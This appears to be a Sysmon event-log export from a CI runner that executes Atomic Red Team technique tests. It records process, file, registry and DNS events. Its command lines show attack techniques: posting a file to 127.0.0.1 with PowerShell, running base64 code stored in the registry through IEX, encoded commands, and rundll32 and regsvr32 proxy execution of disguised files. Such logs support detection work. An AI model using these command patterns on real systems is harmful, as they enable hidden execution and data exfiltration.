CommandLine: ""powershell.exe"" & {Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body \""""C:\AtomicRedTeam\atomics\T1027\src\T1027-cc-macro.xlsm\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:43.919
ProcessGuid: {f995aebf-6763-6942-1908-000000000e00}
ProcessId: 1372
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bir4wuc2.0p2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:43.901
ProcessGuid: {f995aebf-6763-6942-1908-000000000e00}
ProcessId: 1372
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bir4wuc2.0p2.ps1
CreationUtcTime: 2025-12-17 08:18:43.901
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:43.029
ProcessGuid: {f995aebf-6762-6942-1608-000000000e00}
ProcessId: 7736
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gagup25a.1d5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:43.011
ProcessGuid: {f995aebf-6762-6942-1608-000000000e00}
ProcessId: 7736
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gagup25a.1d5.ps1
CreationUtcTime: 2025-12-17 08:18:43.011
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:42.944
ProcessGuid: {f995aebf-6762-6942-1608-000000000e00}
ProcessId: 7736
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-6762-6942-1408-000000000e00}
ParentProcessId: 5980
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {$OriginalCommand = 'Write-Host \""""Hey, Atomic!\""""'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug -Value $EncodedCommand
powershell.exe -Command \""""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:42.743
ProcessGuid: {f995aebf-6762-6942-1408-000000000e00}
ProcessId: 5980
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_oytarxnr.qle.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:42.723
ProcessGuid: {f995aebf-6762-6942-1408-000000000e00}
ProcessId: 5980
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_oytarxnr.qle.ps1
CreationUtcTime: 2025-12-17 08:18:42.723
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:42.646
ProcessGuid: {f995aebf-6762-6942-1408-000000000e00}
ProcessId: 5980
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$OriginalCommand = 'Write-Host \""""Hey, Atomic!\""""'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug -Value $EncodedCommand
powershell.exe -Command \""""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:42.192
ProcessGuid: {f995aebf-6762-6942-1308-000000000e00}
ProcessId: 7628
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2wjuzfom.qsk.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:42.174
ProcessGuid: {f995aebf-6762-6942-1308-000000000e00}
ProcessId: 7628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2wjuzfom.qsk.ps1
CreationUtcTime: 2025-12-17 08:18:42.173
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:42.098
ProcessGuid: {f995aebf-6762-6942-1308-000000000e00}
ProcessId: 7628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-6761-6942-1108-000000000e00}
ParentProcessId: 1976
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {$OriginalCommand = 'Write-Host \""""Hey, Atomic!\""""'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:42.002
ProcessGuid: {f995aebf-6761-6942-1108-000000000e00}
ProcessId: 1976
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1y2al3ok.gy5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:41 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:41.983
ProcessGuid: {f995aebf-6761-6942-1108-000000000e00}
ProcessId: 1976
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1y2al3ok.gy5.ps1
CreationUtcTime: 2025-12-17 08:18:41.983
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:41.897
ProcessGuid: {f995aebf-6761-6942-1108-000000000e00}
ProcessId: 1976
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$OriginalCommand = 'Write-Host \""""Hey, Atomic!\""""'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:39 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:39.474
ProcessGuid: {f995aebf-675f-6942-0d08-000000000e00}
ProcessId: 3296
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yim0u1cx.zf4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:39 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:39.454
ProcessGuid: {f995aebf-675f-6942-0d08-000000000e00}
ProcessId: 3296
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yim0u1cx.zf4.ps1
CreationUtcTime: 2025-12-17 08:18:39.454
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:38.056
ProcessGuid: {f995aebf-675d-6942-0108-000000000e00}
ProcessId: 1112
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0vdlrme5.hww.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:38.036
ProcessGuid: {f995aebf-675d-6942-0108-000000000e00}
ProcessId: 1112
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0vdlrme5.hww.ps1
CreationUtcTime: 2025-12-17 08:18:38.036
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:35 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:18:35.991
ProcessGuid: {f995aebf-675b-6942-f007-000000000e00}
ProcessId: 7212
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:30 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:30.414
ProcessGuid: {f995aebf-6756-6942-e907-000000000e00}
ProcessId: 10076
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jgl4upm3.eqf.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:30 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:18:30.393
ProcessGuid: {f995aebf-6756-6942-e907-000000000e00}
ProcessId: 10076
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jgl4upm3.eqf.ps1
CreationUtcTime: 2025-12-17 08:18:30.393
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:29 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:18:29.205
ProcessGuid: {f995aebf-6755-6942-e307-000000000e00}
ProcessId: 7712
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:16:30 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:16:30.306
ProcessGuid: {f995aebf-66dd-6942-da07-000000000e00}
ProcessId: 9072
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SysWOW64\rundll32.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0xni32so.0r5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:16:30 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:16:30.165
ProcessGuid: {f995aebf-66dd-6942-da07-000000000e00}
ProcessId: 9072
Image: C:\Windows\SysWOW64\rundll32.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0xni32so.0r5.ps1
CreationUtcTime: 2025-12-17 08:16:30.165
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:16:28 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:16:28.648
ProcessGuid: {f995aebf-66dc-6942-d607-000000000e00}
ProcessId: 5360
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:14:28 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:14:28.950
ProcessGuid: {f995aebf-6664-6942-c907-000000000e00}
ProcessId: 7816
Image: C:\Users\RUNNER~1\AppData\Local\Temp\not_an_scr.scr
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: Windows Calculator
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CALC.EXE
CommandLine: not_an_scr.scr /p 67866
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
ParentProcessGuid: {f995aebf-6664-6942-c807-000000000e00}
ParentProcessId: 4920
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: rundll32.exe  desk.cpl,InstallScreenSaver not_an_scr.scr
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:14:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:14:27.502
ProcessGuid: {f995aebf-6663-6942-b907-000000000e00}
ProcessId: 7780
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gime0fe3.qyv.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:14:27 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:14:27.482
ProcessGuid: {f995aebf-6663-6942-b907-000000000e00}
ProcessId: 7780
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gime0fe3.qyv.ps1
CreationUtcTime: 2025-12-17 08:14:27.482
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:14:26 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:14:26.719
ProcessGuid: {f995aebf-6662-6942-b207-000000000e00}
ProcessId: 3104
Image: C:\Windows\System32\wscript.exe
FileVersion: 10.0.26100.7019
Description: Microsoft ? Windows Based Script Host
Product: Microsoft ? Windows Script Host
Company: Microsoft Corporation
OriginalFileName: wscript.exe
CommandLine: ""C:\Windows\System32\WScript.exe"" ""C:\AtomicRedTeam\atomics\T1218.011\src\akteullen.vbs"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=EF603F10CFE6635756FE871D0DAD83D49E5DC552D8288395A745A14DCFE534D3
ParentProcessGuid: {f995aebf-6662-6942-b107-000000000e00}
ParentProcessId: 3392
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: rundll32.exe  URL.dll,FileProtocolHandler ""C:\AtomicRedTeam\atomics\T1218.011\src\akteullen.vbs""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:14:26 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:14:26.075
ProcessGuid: {f995aebf-6662-6942-ad07-000000000e00}
ProcessId: 6184
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:12:25 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:12:25.540
ProcessGuid: {f995aebf-65e9-6942-a107-000000000e00}
ProcessId: 1784
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:11:20 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:11:20.839
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:11:20 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:11:20.839
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:11:20 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:11:20.837
ProcessGuid: {f995aebf-552d-6942-cc00-000000000e00}
ProcessId: 5784
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:10:26 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:10:25.134
ProcessGuid: {f995aebf-6571-6942-9307-000000000e00}
ProcessId: 2756
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\rundll32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:10:26 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:10:24.680
ProcessGuid: {f995aebf-6570-6942-8e07-000000000e00}
ProcessId: 4192
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\rundll32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:10:24 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:10:24.004
ProcessGuid: {f995aebf-656f-6942-8b07-000000000e00}
ProcessId: 4132
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:09:06 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 08:09:06.736
ProcessGuid: {f995aebf-552f-6942-d500-000000000e00}
ProcessId: 7572
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotiT1218.005.hta
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:08:23 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:08:23.370
ProcessGuid: {f995aebf-64f7-6942-7d07-000000000e00}
ProcessId: 9988
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:06:24 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:06:22.881
ProcessGuid: {f995aebf-647e-6942-6e07-000000000e00}
ProcessId: 6156
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\rundll32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:20 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:20.115
ProcessGuid: {f995aebf-647c-6942-6707-000000000e00}
ProcessId: 3568
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /U /s C:\Users\RUNNER~1\AppData\Local\Temp\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-647c-6942-6507-000000000e00}
ParentProcessId: 8772
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /U /s %temp%\shell32.jpg
ParentUser: runnervm8j6r3\runneradmin"
